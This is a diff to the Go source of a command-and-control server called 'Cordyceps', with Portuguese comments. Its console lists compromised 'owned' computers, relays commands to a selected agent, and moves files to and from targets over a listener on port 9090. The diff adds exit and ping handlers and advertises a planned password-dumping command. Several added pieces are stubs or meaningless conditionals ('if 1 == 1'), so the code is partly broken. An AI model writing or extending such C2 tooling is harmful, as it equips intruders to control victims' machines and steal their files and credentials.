@@ -5,12 +5,12 @@ import (
 	"NetBios/C2/d3c/commons/helpers"
 	"bufio"
 	"encoding/gob"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"net"
 	"os"
 	"strings"
-	"fmt"
 )
 
 var (
@@ -28,10 +28,10 @@ func main() {
 	fmt.Print("    \\/___/  \\/___/  \\/_/ \\/__,_ /`/___/> \\/____/\\/____/ \\ \\ \\/  \\/___/ \n")
 	fmt.Print("                                    /\\___/               \\ \\_\\        \n")
 	fmt.Print("     ")
-		println("--------------------Developed By V3x0r-------------------------")
-		println("")
-		println("")
-		println("")
+	println("--------------------Developed By V3x0r-------------------------")
+	println("")
+	println("")
+	println("")
 	//Escuta na porta 9090
 	go startListener("9090")
 	cliHandler()
@@ -44,7 +44,6 @@ func cliHandler() {
 			print(agenteSelecionado + "# ")
 		} else {
 			// Nome do Servidor
-
 			print("Cordyceps> ")
 		}
 		// Le o que foi digitado
@@ -92,6 +91,10 @@ func cliHandler() {
 				} else {
 					println("Specify the file to be Dowaload")
 				}
+			case "exit":
+				exitHandler(comandoSeparado)
+			case "ping":
+				pongHandler(comandoSeparado)
 			default:
 				if agenteSelecionado != "" {
 					//Envia o Comando para o agente selecionado
@@ -115,11 +118,13 @@ func cliHandler() {
 func helpHandler(comando []string) {
 	if len(comando) > 0 {
 		println("Server Commands:")
-		println("show agents -a:        List all agents in exucation")
+		println("show agents:           List all agents in exucation")
 		println("select + ID do agent:  Selects agent with specified id")
-		println("select:                Return to starting point")
 		println("send:                  Send Files to Target")
 		println("get:                   Download Files to Host")
+		println("exit:                  Exite for Agente Selected")
+		//TODO - Modulo de Quebrar Senhas
+		println("passwd:           Dump Passwords for local machine")
 	} else {
 		println("Comando não Encontrado")
 	}
@@ -129,7 +134,11 @@ func showHandler(comando []string) {
 		switch comando[1] {
 		case "agents":
 			for _, agente := range agentesEmCampo {
-				println("Owned Computer: " + agente.AgentID)
+				if 1 == 1 {
+					println("Owned Computer: " + agente.AgentID)
+				} else {
+					println("Owned Computer with closed connection: " + agente.AgentID)
+				}
 			}
 		default:
 			log.Println("Command Passed Wrong, Use: show agents -a")
@@ -137,14 +146,25 @@ func showHandler(comando []string) {
 	}
 }
 
+func pongHandler(comando []string) {
+	//TODO - Implementar Funcao para verificar conexao
+
+}
+
 func selectHandler(comando []string) {
 	if len(comando) > 1 {
 		if agenteCadastrado(comando[1]) {
 			agenteSelecionado = comando[1]
 		} else {
-			log.Println("Agent not found, To list your agents use: show agents -a")
+			log.Println("Agent not found, To list your agents use: show agents")
 		}
+	}
 
+}
+func exitHandler(comando []string) {
+	if len(comando) > 1 {
+		if agenteCadastrado(comando[1]) {
+		}
 	} else {
 		agenteSelecionado = ""
 	}
